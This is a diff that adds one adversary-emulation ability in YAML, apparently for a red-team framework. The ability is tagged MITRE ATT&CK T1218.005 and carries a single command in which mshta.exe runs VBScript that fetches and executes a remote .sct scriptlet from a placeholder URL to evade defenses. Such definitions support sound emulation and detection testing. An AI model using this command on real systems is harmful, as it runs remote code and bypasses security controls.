@@ -1,0 +1,21 @@
+- id: b6f66a1c-1a88-14d4-762f-b55d9a25306a
+  name: Mshta.exe - Executes VBScript supplied as a command line argument.
+  description: Executes VBScript supplied as a command line argument.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.005
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
